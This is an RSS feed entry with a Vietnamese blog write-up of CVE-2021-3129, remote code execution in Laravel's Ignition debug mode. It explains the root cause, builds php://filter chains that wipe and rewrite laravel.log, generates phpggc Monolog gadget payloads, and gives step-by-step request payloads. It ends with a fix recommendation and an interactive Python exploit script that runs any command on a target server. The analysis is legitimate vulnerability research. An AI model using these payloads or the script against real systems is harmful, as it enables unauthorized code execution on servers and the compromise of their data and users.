<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Laravel - Tag - g03m0n</title>
        <link>https://g03m0n.github.io/tags/laravel/</link>
        <description>Laravel - Tag - g03m0n</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 01 May 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/laravel/" rel="self" type="application/rss+xml" /><item>
    <title>CVE-2021-3129</title>
    <link>https://g03m0n.github.io/posts/cve-2021-3129/</link>
    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cve-2021-3129/</guid>
    <description><![CDATA[<h1 id="laravel--v842-debug-mode-remote-code-execution-cve-2021-3129">Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</h1>
<h1 id="description-and-impact">Description and Impact</h1>
<p>Ignition là một công cụ gỡ lỗi phổ biến trong Laravel, đóng một vai trò quan trọng trong việc hỗ trợ các nhà phát triển trong quá trình phát triển ứng dụng. Nó được cài đặt mặc định từ Laravel 6+.</p>
<p>Ngoài ra Ignition còn cung cấp các mô-đun hay còn gọi là  <code>Solutions</code> , giúp ta tìm và sửa lỗi một cách dễ dàng và nhanh chóng.</p>
<p></p>
<p>Tuy nhiên, chức năng của nó đi kèm với một lỗ hổng khiến các trang web sử dụng phiên bản Laravel &lt;= 8.4.2 và Ignition &lt;= 2.5.1 với chế độ DEBUG được bật có nguy cơ bị tấn công RCE. Lỗ hổng nghiêm trọng này cho phép những kẻ tấn công không được xác thực thực thi mã tùy ý từ xa do sử dụng hàm <code>file_get_contents()</code> và <code>file_put_contents()</code> một cách không an toàn, có khả năng phá hoại dữ liệu ứng dụng, tài nguyên máy chủ và quyền riêng tư của người dùng.</p>
<p><strong>CVSS Severity: 9.8 (Critical)</strong></p>
<h1 id="prepare">Prepare</h1>
<h2 id="ignition-debug-example">Ignition debug example</h2>
<p>Sửa hoặc thêm <code>{{ $varialbe }}</code> vào file <code>/resource/views/welcome.blade.php</code> để làm xuất hiện chế độ debug của <code>Ignition</code></p>
<p></p>
<p>Khi click vào <code>Make variable optional</code> thì nó sẽ tự động replace <code>{{ $varialbe }}</code> thành </p>
<p><code>{{ $varialbe ?? '' }}</code>. Kiểm tra log thì ta thấy được request như sau:</p>
<p></p>
<p><strong>Trong gói tin này:</strong></p>
<ul>
<li>Param <code>solution</code> : Chỉ định <code>class</code>  sẽ được thực thi. Ở đây là class <code>MakeViewVariableOptionalSolution</code>.</li>
<li><code>parameters</code>: Đây là một JSON Object bổ sung, chứa các params cụ thể cho <code>solution</code>.</li>
<li>Param <code>variableName</code>: Đây là tên của biến trong view mà Ignition đề xuất để sửa.</li>
<li>Param <code>viewFile</code>: Đây là đường dẫn tới file view chứa <code>variableName</code>.</li>
</ul>
<h2 id="phar-deserialization">Phar Deserialization</h2>
<h3 id="deserialize-attack">Deserialize Attack</h3>
<p>Là kỹ thuật mà attacker có thể control được object serialize thông qua đó có thể điều chỉnh được các giá trị của các thuộc tính trong một class tuỳ theo ý muốn, đồng thời lợi dụng điểm yếu của các magic method để thực thi code và tấn công. Điển hình là các lỗi về: <code>SQL injection</code>, <code>Code injection</code>,…</p>
<h3 id="magic-method">Magic method</h3>
<p>Magic method là những phương thức đặc biệt trong php được khai báo có dấu <code>2 gạch</code> ở trước như <code>__construct()</code>,<code>__destruct()</code>, <code>__sleep()</code>,… và những phương thức này sẽ không thực thi nếu không được gọi, mục đích tạo ra là để giải quyết vấn đề về sự kiện trong chương trình.</p>
<p><code>__construct()</code> : sẽ được call khi một đối tượng được khởi tạo.</p>
<p><code>__destruct()</code> : sẽ được call khi một đối tượng bị huỷ hoặc kết thúc chương trình.</p>
<p><code>__wakeup()</code> : được call khi một đối tượng được deserialize.</p>
<p><code>__toString()</code>: được call khi một đối tượng được gọi như một chuỗi.</p>
<h3 id="phar">Phar</h3>
<p>Phar là một phần mở rộng trong php, nó giống như 1 file zip và bên trong nó chứa mã nguồn php hoặc giống như một kho lưu trữ mã nguồn PHP, nghĩa là tập hợp include các file PHP vào chung 1 phar khi excute thì sẽ tự động thực thi toàn bộ các file PHP bên trong nó mà không cần phải extract các PHP đó vào một thư mục nào trước đó cả.</p>
<h3 id="phar-stream-wrapper">phar:// Stream Wrapper</h3>
<p>Trong PHP, tất cả các thao tác với tệp đều được xử lý bằng <a href="https://www.php.net/manual/en/intro.stream.php" target="_blank" rel="noopener noreffer">stream</a>
.</p>
<p>Ví dụ: <code>http://</code>, <code>ftp://</code>, <code>file://</code>, <code>php://</code>, <code>phar://</code>,…</p>
<ul>
<li><code>filegetcontents(&quot;http://example.com/image.jpeg&quot;)</code></li>
<li><code>filegetcontents(&quot;file://../images/image.jpeg&quot;)</code></li>
<li><code>filegetcontents(&quot;phar://./folder/app.phar&quot;)</code></li>
</ul>
<p>phar:// stream wrapper được sử dụng để tương tác với các tệp PHAR. Nó cho phép ta thực hiện nhiều thao tác <code>read</code>/<code>write</code> khác nhau trên server. Ngoài ra ta còn có thể truy cập vào các file bên trong một file phar thông qua các <code>filesytstem function</code>.</p>
<h3 id="phar-archives">PHAR archives</h3>
<p>Cấu trúc của một file phar:</p>
<p><strong><code>Stub</code>: Là một file PHP mà ta cần gói lại.</strong></p>
<p>VD:   <strong><!-- raw HTML omitted --></strong></p>
<p><strong><code>manifest</code> :</strong> Chứa các trường siêu dữ liệu (metadata) bao gồm thông tin về archive và các file trong archive. </p>
<p>Đặc biệt, theo như dòng thứ hai từ dưới lên**,** nó sẽ chứa những Meta-data đã được serialize và nó sẽ được unserialize nếu được trigger bởi các <code>filesystem function</code> khi gọi đến một file <code>Phar</code> thông qua <code>phar://</code> stream wrapper.</p>
<p></p>
<p>Một số <code>filesystem function</code>:</p>
<p></p>
<p><strong><code>File contents</code>:</strong>  Là các file thực có trong archive.</p>
<p><strong><code>Signature</code>: L</strong>à một hàm băm của file archive, ta phải có chữ ký hợp lệ nếu muốn truy cập file archive từ PHP.</p>
<ul>
<li>
<p>Điều kiện để có thể khai thác được Phar Deserialize:</p>
<p>Ta phải load được một file có nội dung tùy ý và biết được đường dẫn đến file này trong hệ thống. Tìm được một <code>filesystem function</code> trên để trigger file phar và đồng thời ta phải control được tên của file.</p>
</li>
</ul>
<h1 id="root-cause-analysis">Root Cause Analysis</h1>
<p>Lỗ hổng xảy ra ở solution <code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>. Tại đây, ứng dụng sử dụng hai hàm để <code>read</code> và <code>write</code> tệp trong PHP là: <code>file_get_contents()</code> và <code>file_put_contents()</code>. Sai lầm nghiêm trọng nằm ở việc thiếu xác thực trong việc kiểm tra input của người dùng, cụ thể là các biến môi trường được chuyển đến các chức năng này. Kẻ tấn công có thể khai thác lỗ hổng này bằng việc tiêm mã độc thông qua các biến môi trường, sau đó Ignition sẽ đọc và thực thi, cấp cho kẻ tấn công toàn quyền kiểm soát ứng dụng.</p>
<p></p>
<p>Luồng hoạt động của ứng dụng:</p>
<p>Đầu tiên, phương thức <code>makeOptional()</code> sẽ được gọi:</p>
<p></p>
<p>Nó sẽ đọc một tập tin có đường dẫn được truyền trong tham số <code>viewFile</code>:</p>
<p></p>
<p>Sau đó, biến được truyền vào  <code>variableName</code> sẽ thay đổi định dạng từ <code>$variable</code> thành  <code>$variable ?? ''</code></p>
<p></p>
<p>Sau đó, chương trình sẽ thực hiện so sánh token và verify để đảm bảo để đảm bảo rằng các biến trong tệp <code>view</code> luôn có giá trị hợp lệ, tránh lỗi khi biến không tồn tại.:</p>
<p></p>
<p>Nếu có lỗi xảy ra, thì <code>makeOptional()</code> sẽ trả về lỗi, nếu không <code>$newContent</code> sẽ được ghi đè:</p>
<p></p>
<p></p>
<p>Do đó, ta không thể làm được gì nhiều khi sử dụng param <code>variableName</code>.</p>
<p>Input variable duy nhất còn lại là <code>viewFile</code>, từ đoạn code trên ta có thể viết lại đoạn code rút gọn như sau:</p>
<pre tabindex="0"><code> $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]);
 file_put_contents($parameters[&#39;viewFile&#39;], $output);
</code></pre><h3 id="php-wrappers-changing-a-file">PHP wrappers: changing a file</h3>
<p>Trong Laravel, Laravel sử dụng thự viện <code>Monolog</code> được tích hợp sẵn để cung cấp và hỗ trợ nhiều cách xử lý log khác nhau. Mặc định có một file log được lưu trữ trong thư mục <code>storage/logs</code>.</p>
<p>Khi ta truyền vào biến <code>viewFile</code> một đường dẫn không tồn tại, file log sẽ gi lại những gì chúng ta nhập.</p>
<p></p>
<p>Do đó, ta có thể kiểm soát được một phần nhỏ nội dung của tệp <code>laravel.log</code> bằng cách truyền payload vào biến <code>viewFile</code>.</p>
<p>Vì ở đây ứng dụng sử dụng hàm <code>file_get_contents()</code> để đọc file nên ta sẽ sử dụng PHP Wrapper, cụ thể là <a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener noreffer">php://filter</a>
 . Bằng cách sử dụng kết hợp các filter tích hợp, ta có thể chỉnh sửa nội dung của tệp trước khi được trả về.</p>
<p></p>
<p>VD:</p>
<pre tabindex="0"><code>$ echo &#39;hello&#39; | base64 | base64 &gt; /tmp/tu.txt
$ cat /tmp/tu.txt
aGVsbG8K
</code></pre><p>Sau đó, viết một script PHP thực hiện các thao tác <code>read</code> và <code>write</code> file tương tự như các thao tác được sử dụng trong Ignition.</p>
<pre tabindex="0"><code>&lt;?php
$file = &#39;php://filter/convert.base64-decode/resource=/tmp/tu.txt&#39;;
// Đọc file /tmp/tu.txt và base64-decode sau đó lưu vào biến $contents
$contents = file_get_contents($file);
// Base64-decode biến $contents sau đó ghi đè lên dữ liệu cũ
file_put_contents($file, $contents);
</code></pre><pre tabindex="0"><code>$ cat /tmp/tu.txt
hello
</code></pre><p>Khi decode-base64, base64 sẽ không decode những kí tự không nằm trong <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreffer"><code>Base64 Encoding Alphabet</code></a>
 mà loại bỏ chúng.</p>
<p>VD:</p>
<pre tabindex="0"><code>echo &#39;SGVsbG8K!!!!;;&#39; &gt; /tmp/test.txt
</code></pre><pre tabindex="0"><code>$file = &#39;php://filter/read=convert.base64-decode/resource=/tmp/test.txt&#39;;
$contents = file_get_contents($file);
file_put_contents($file, $contents);
</code></pre><p>!</p>
<p>Ta có thể sử dụng cách này để xóa nội dung của file log.</p>
<p>Như vậy ta đã có đủ 2 điều kiện để sử dụng kỹ thuật Phar Deserialization: Kiểm soát được file <code>laravel.log</code> với Wrapper <code>php://filter</code> và biết được đường dẫn của file <code>laravel.log</code> là <code>storage/logs/laravel.log</code></p>
<p>Nhưng ta mới chỉ kiểm soát được một phần nhỏ file log, để thực hiện kỹ thuật Phar Deserialization ta cần phải kiểm soát được toàn bộ nội dung của file log.</p>
<h3 id="deleting-and-writing-the-log-file">Deleting and writing the log file</h3>
<p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
<pre tabindex="0"><code>[Date][Error_data]&lt;viewFile&gt;[Error_data]&lt;viewFile&gt;[Error_data]
</code></pre><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
 . Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
<table>
<thead>
<tr>
<th>Character</th>
<th>UTF-8</th>
<th>UTF-16LE</th>
<th>UTF-16BE</th>
</tr>
</thead>
<tbody>
<tr>
<td>U+0041 (a)</td>
<td>0x41</td>
<td>0x41 0x00</td>
<td>0x00 0x41</td>
</tr>
</tbody>
</table>
<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0[Error_data]H\0e\0l\0l\0o\0[Error_data]&#39;&gt; /tmp/test.txt
</code></pre><pre tabindex="0"><code>&lt;?php
$file = &#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;;
$contents = file_get_contents($file); 
file_put_contents($file, $contents); 
</code></pre><p></p>
<p>Vì payload xuất hiện 2 lần nên ta cần loại bỏ đi một cái mới đúng cấu trúc của file Phar. Ta chỉ cần thêm 1 byte vào cuối payload 1 và sử dụng cách trên convert payload từ <code>UTF16</code> sang <code>UTF8</code> để biến payload thứ 2 thành junk chars (vì <code>UTF16</code> làm việc với 2 byte nên byte alignment của payload thứ 2 sẽ bị lệch):</p>
<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0a[Error_data]H\0e\0l\0l\0o\0a[Error_data]&#39; &gt; /tmp/test.txt
</code></pre><p></p>
<p>Nhưng payload được truyền vào hàm <code>file_get_contents()</code> dưới dạng đường dẫn của tệp, do đó, ta sẽ không thể truyền vào các NULL byte (<code>\00</code>) để biểu diễn payload ở định dạng <code>UTF-16</code>. Nên ta có thể thay thế bằng ký tự <code>=00</code> sau đó sử dụng filter <a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable" target="_blank" rel="noopener noreffer">convert.quoted-printable</a>
  ****để convert các ký tự <code>=00</code> thành NULL byte (<code>\00</code>).</p>
<p></p>
<p>Vậy, kết luận chúng ta sẽ có Payload cuối cùng là:</p>
<pre tabindex="0"><code>&#34;viewFile&#34; : &#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8
				|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
</code></pre><p>Trong đó:</p>
<ul>
<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
<li><code>convert.base64-decode</code>: xóa các byte bị convert sang utf-8 mà nằm ngoài bảng mã.</li>
</ul>
<p>Nhưng vì sử dụng bảng mã <code>UTF-16</code> nên kích thước file log cần phải là bội số của 2 byte, nên ta cần gửi hai request như dưới đây, vì các <code>Error_data[1,2,3]</code>sẽ xuất hiện hai lần và <code>PAYLOAD_A</code> và <code>PAYLOAD_B</code> cũng xuất hiện hai lần nên tổng số byte sẽ luôn là số chẵn.</p>
<pre tabindex="0"><code>[Error_data1]PAYLOAD_A[Error_data2]PAYLOAD_A[Error_data3]
[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
</code></pre><p>Để <code>PAYLOAD_A</code> biến mất khi decode-base64, ta sẽ gửi 1 payload với số byte chẵn như <code>AA</code> và biến <code>PAYLOAD_B</code> thành PHAR payload.</p>
<pre tabindex="0"><code>[Error_data1]AA[Error_data2]AA[Error_data3]
[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
</code></pre><ul>
<li>
<p>Note:</p>
<p>Các <code>Error_data</code> có kích thước giống nhau vì nó gặp lỗi ở cùng một vị trí nên các <code>Error_data</code> sẽ giống nhau. VÌ vậy, trong mọi trường hợp, kích thước của file log luôn là số chẵn.</p>
</li>
</ul>
<p>Ta rút ra được quy trình khai thác sau:</p>
<p>Xóa log → Gửi content ‘AA’ → Gửi payload (các <code>Error_data</code> sẽ xuất hiện 2 lần) → Chẵn ký tự. Vì payload xuất hiện 2 lần nên dựa vào chức năng của filter <code>convert.iconv.utf-16le.utf-8</code> chỉ cần thêm 1 byte vào sau payload thì quá trình decode payload thứ 2 sẽ bị lệch byte và trở thành <code>junk chars</code> → Chạy PHAR deserialization.</p>
<ul>
<li>
<p>Note</p>
<p>Ngoài ra ta có thể sử dụng filter <code>consumed</code> (undocument) để xóa nội dung file log bằng cách:</p>
<pre tabindex="0"><code>php://filter/write=consumed/resources=../storage/logs/laravel.log
</code></pre><p>Ngoài ra, nếu sử dụng filter <code>base64-decode</code> lên một chuỗi có chứa dấu <code>=</code> ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.</p>
</li>
</ul>
<h2 id="create-payload-with-phpggc">Create Payload with PHPGGC</h2>
<p>Ở đây ta sẽ sử dụng <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">phpggc</a>
 để tạo payload. Công cụ này tạo ra các gadget-chains cho các cuộc tấn công PHP Deserialization. Và nó có thể tạo payload dưới dạng PHAR file với argument <code>--phar phar</code>.</p>
<p>Như đã nói ở trên, <code>Monolog</code> là một thư viện có sẵn trong Laravel nên ta sẽ sử dụng gadget <code>monolog/rce1</code>.</p>
<pre tabindex="0"><code>php -d&#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system &#39;id&#39; --phar phar -o php://output | base64 -w0
| python -c &#34;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in input()]).upper())&#34;
</code></pre><ul>
<li>
<p>Trong đó:</p>
<p><code>-d'phar.readonly=0'</code>: Đây là tùy chọn dòng lệnh cho PHP cho phép sửa đổi các tệp Phar. Theo mặc định, PHP sẽ chỉ cho phép đọc tệp Phar, nhưng tùy chọn này cho phép ghi và sửa đổi nội dung của tệp Phar.</p>
<p><code>print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in input()]).upper())</code>: chuyển từng ký tự thành mã Unicode của nó rồi chuyển mã Unicode thành mã Hex sau đó thêm ký tự &ldquo;=&rdquo; ở đầu và cuối mỗi chuỗi Hex và thêm chuỗi <code>00</code> ở cuối mỗi cặp Hex. Cuối cùng dùng hàm <code>join()</code> để ghép các chuỗi Hex thành một chuỗi duy nhất và dùng hàm <code>upper()</code> chuyển đổi tất cả các ký tự trong chuỗi thành ký tự in hoa.</p>
<p>VD: Ký tự <code>P</code> có mã hex là 50 → <code>=50=00</code></p>
</li>
</ul>
<h1 id="steps-to-reproduce">Steps to reproduce</h1>
<ul>
<li>
<p>Prepare environment</p>
<ul>
<li>docker-compose.yml</li>
</ul>
<pre tabindex="0"><code>version: &#39;2&#39;
services:
 web:
		build: .
    image: vulhub/laravel:8.4.2
    ports:
         - &#34;3333:80&#34;
</code></pre><ul>
<li>Dockerfile</li>
</ul>
<pre tabindex="0"><code>RUN pecl install xdebug-3.1.5
&amp;&amp; docker-php-ext-enable xdebug
&amp;&amp; echo &#34;[xdebug]&#34; 
		&gt;&gt; /usr/local/etc/php/php.ini
&amp;&amp; echo &#34;zend_extension=xdebug.so&#34; 
		&gt;&gt; /usr/local/etc/php/php.ini
&amp;&amp; echo &#34;xdebug.mode=develop,debug&#34; 
		&gt;&gt; /usr/local/etc/php/php.ini
&amp;&amp; echo &#34;xdebug.start_with_request=yes&#34; 
		&gt;&gt; /usr/local/etc/php/php.ini
&amp;&amp; echo &#34;xdebug.log=/tmp/xdebug_remote.log&#34; 
		&gt;&gt; /usr/local/etc/php/php.ini
</code></pre></li>
</ul>
<ol>
<li>Đầu tiên, ta tiến hành xóa log trong file <code>laravel.log</code> bằng <code>consumed</code> filter.</li>
</ol>
<p>Payload:</p>
<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;
</code></pre><p></p>
<ol start="2">
<li>Gửi payload <code>AA</code> để căn chỉnh kích thước của file log.</li>
</ol>
<p>Payload:</p>
<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;AA&#34;
</code></pre><p></p>
<ol start="3">
<li>Tạo log chứa payload:</li>
</ol>
<p>Payload: (whoami)</p>
<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;=50=00=44=00=39=00=77=00=61=00=48=00...=67=00=3D=00=3D=00a&#34;
</code></pre><p></p>
<ol start="4">
<li>Convert file log sang PHAR file.</li>
</ol>
<p>Payload:</p>
<pre tabindex="0"><code>&#34;viewFile&#34;:
&#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8
			|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
</code></pre><p></p>
<ul>
<li>
<p>Debug</p>
<ul>
<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
</ul>
<pre tabindex="0"><code>&#34;viewFile&#34;:
&#34;php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log&#34;
</code></pre><p></p>
<ul>
<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
</ul>
<pre tabindex="0"><code>&#34;viewFile&#34;:
&#34;php://filter/write=convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log&#34;
</code></pre><p></p>
<ul>
<li><code>convert.base64-decode</code>: xóa các ký tự khi convert từ <code>UTF-16</code> sang <code>UTF-8</code> mà nằm ngoài bảng mã và convert file log sang PHAR file.</li>
</ul>
<pre tabindex="0"><code>&#34;viewFile&#34;:
&#34;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&#34;
</code></pre><p></p>
</li>
</ul>
<ol start="5">
<li>Chạy PHAR deserialization</li>
</ol>
<p>Payload:</p>
<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;phar:///var/www/storage/logs/laravel.log&#34;
</code></pre><p></p>
<ul>
<li>
<p>Script exploit tự động</p>
<pre tabindex="0"><code>import requests, sys, re, os
import argparse, urllib3

urllib3.disable_warnings()

def sendPayload(payload):
    url = &#34;http://localhost:3333/_ignition/execute-solution&#34;#change this
    header = {
            &#34;Accept&#34;: &#34;application/json&#34;
            }
    data = {
            &#34;solution&#34;: &#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;,
            &#34;parameters&#34;: {
                &#34;variableName&#34;: &#34;variable&#34;,
                &#34;viewFile&#34;: &#34;&#34;
            }
        }
    data[&#34;parameters&#34;][&#34;viewFile&#34;] = payload
    resp = requests.post(url=url, headers=header, json=data, verify=False)
    if resp.status_code == 500 and &#39;php.ini&#39; in resp.text:
        m = re.findall(r&#39;\{(.|\n)+\}((.|\n)*)&#39;, resp.text)
        print(&#34;Result: &#34; , m[0][1])
    return resp

def clearLog():
    return sendPayload(&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;)
    # php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

def decodeLog():
    return sendPayload(
        &#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;)

def unserializeLog():
    return sendPayload(&#34;phar://../storage/logs/laravel.log/test.txt&#34;)
def genPHPGGC(command):
    payload = &#34;&#34;&#34;php -d &#39;phar.readonly=0&#39; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c &#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34; &gt; payload.txt&#34;&#34;&#34;%(command)
    os.system(payload)
    with open(&#39;payload.txt&#39;, &#39;r&#39;) as f:
        payload = f.read().replace(&#39;\n&#39;, &#39;&#39;) + &#39;a&#39;
    os.system(&#34;rm -r payload.txt&#34;)
    print (payload)
    return payload

def main():
    while True:
        command = input(&#34;Enter command (or &#39;exit&#39; to quit): &#34;)
        if command.lower() == &#39;exit&#39;:
            break
        clearLog()
        sendPayload(&#39;AA&#39;)
        sendPayload(genPHPGGC(command))
        decodeLog()
        unserializeLog()
if __name__ == &#39;__main__&#39;:
    main()
</code></pre><p>VD: python3 <a href="http://exp.py" target="_blank" rel="noopener noreffer">exp.py</a>
 ‘id’</p>
</li>
</ul>
<h1 id="recommendation">Recommendation</h1>
<p>So sánh 2 file code, sau khi update Laravel đã thêm vào một hàm kiểm tra input của người dùng truyền qua param <code>viewFile</code> là <code>isSafePath()</code>. Hàm này có tác dụng kiểm tra xem input có bắt đầu bằng đường dẫn tuyệt đối <code>/</code>, đường dẫn tương đối <code>./</code> hoặc file có kết thúc bằng extention <code>blade.php</code> hay không, nếu không thì return <code>false</code>.</p>
<p></p>
<p>Nếu cần bật chế độ Debug trên môi trường non-local thì nên tắt chế độ Suggestion Solutions của Ignition bằng cách set <code>ignition.enable_runnable_solutions</code> thành <code>false</code> trong file <code>.env</code>.</p>
<p></p>
<p>Kể từ phiên bản Ignition <code>2.6.*</code> trở đi chế độ Debug Suggestion Solutions không thể bật ở môi trường non-local.</p>
<h1 id="references">References</h1>
<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">https://www.ambionics.io/blog/laravel-debug-rce</a>
</p>
<p><a href="https://knqyf263.hatenablog.com/entry/2021/10/09/165405" target="_blank" rel="noopener noreffer">https://knqyf263.hatenablog.com/entry/2021/10/09/165405</a>
</p>
]]></description>
</item>
</channel>
</rss>
